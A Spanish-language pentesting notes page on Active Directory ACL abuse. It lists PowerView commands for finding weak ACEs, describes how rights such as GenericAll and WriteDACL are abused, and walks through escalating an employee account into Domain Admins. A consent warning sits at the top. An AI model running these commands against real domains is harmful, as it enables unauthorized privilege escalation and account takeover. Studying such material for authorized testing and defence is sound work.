
# ACLs Vulnerables

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Identificación de ACLs vulnerables</mark>

### Con PowerView

```powershell
Get-DomainGroup | select grouptype,name,description
```

* Buscar la DACL de Admins de dominio

```powershell
Get-DomainObjectAcl -Identity “Domain Admins” | select @{name=“Name”;expression={Convert-SidToName $_.SecurityIdentifier}},AceType,ActiveDirectoryRights | fl
```

### Convertir SID a nombre real

```powershell
Convert-SidToName 1527844-23355422-113211-112
```

### Escaneo de todas las ACEs dentro de nuestro dominio

* Invoke-ACLScanner -ResolverGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl

## <mark style="color:purple;">Listado de ACEs vulnerables</mark>

#### ForceChangePassword:&#x20;

Proporciona la capacidad de cambiar la contraseña del usuario objetivo sin conocer el valor actual. Abusado con Set-DomainUserPassword

#### AddMembers:&#x20;

Proporciona la capacidad de añadir usuarios, grupos o equipos arbitrarios al grupo de destino. Abusado con Add-DomainGroupMember

#### GenericAll:&#x20;

Proporciona control total del objeto, incluyendo la capacidad de añadir otros usuarios a un grupo, cambiar una contraseña de usuario sin conocer su valor actual, registrar un SPN con un objeto de usuario, etc. Abusado con Set-DomainUserPassword o Add-DomainGroupMember

#### GenericWrite:&#x20;

Proporciona la capacidad de actualizar cualquier valor de parámetro de objeto de destino no protegido. Por ejemplo, actualizar el valor del parámetro "scriptPath" en un objeto de usuario de destino para hacer que ese usuario ejecute los comandos/ejecutables especificados la próxima vez que se conecte. Abusado con Set-DomainObject

#### WriteOwner:&#x20;

Proporciona la capacidad de actualizar el propietario del objeto de destino. Una vez que el propietario del objeto ha sido cambiado a un usuario que el atacante controla, el atacante puede manipular el objeto de la manera que crea conveniente. Abusado con Set-DomainObjectOwner

#### WriteDACL:&#x20;

Proporciona la capacidad de escribir una nueva ACE en la DACL del objeto objetivo. Por ejemplo, un atacante puede escribir una nueva ACE en la DACL del objeto de destino, dándole el "control total" del objeto de destino. Abusado con Add-NewADObjectAccessControlEntry

#### AllExtendedRights:&#x20;

Proporciona la capacidad de realizar cualquier acción asociada con los derechos extendidos de Active Directory contra el objeto. Por ejemplo, añadir usuarios a un grupo y forzar el cambio de la contraseña de un usuario de destino. Se abusa con Set-DomainUserPassword o Add-DomainGroupMember

## <mark style="color:purple;">Explotación de ACEs Vulnerables</mark>

{% hint style="info" %}
Vamos a usar como ejemplo a Hanna Elita, una empleada común que por un error de configuración está en el grupo Project Management que tiene los mismos permisos que Admins. del dominio (que es el grupo más privilegiado)
{% endhint %}

### Shell desde un ordenador de un empleado en nombre de otro empleado

Vamos a iniciar una PowerShell en nombre de Hanna Elita (que tiene permisos de admin)

{% code title="Windows de empleado" %}

```
runas /user:corp\hanna.elita /netonly powershell
```

{% endcode %}

{% hint style="success" %}
A partir de este momento podemos realizar diversas acciones con PowerView
{% endhint %}

### Establecer al usuario como admin de un grupo

```
Set-DomainObjectOwner -Identity “Project management” -OwnerIdentity hanna.elita 
```

### Añadir acceso especial al usuario

{% code overflow="wrap" %}

```
Add-DomainObjectAcl -TargetIdentity “Project management” -Rights WriteMembers -PrincipalIdentity hanna.elita
```

{% endcode %}

### Añadir usuario al grupo Project management

```
Add-DomainGroupMember -Identity “Project management” -Members hanna.elita
Add-DomainGroupMember -Identity “Office Admin” -Members hanna.elita
Add-DomainObjectAcl -TargetIdentity “Admins. Del dominio” -Rights WriteMembers -PrincipalIdentity hanna.elita
Add-DomainGroupMember -Identity “Admins. Del dominio” -Members hanna.elita
```

{% hint style="info" %}
Si no funciona cerrar la shell y abrir una nueva para que se actualice el token
{% endhint %}

Y ya seríamos un usuario de Admins. Del dominio con permisos de administrador.
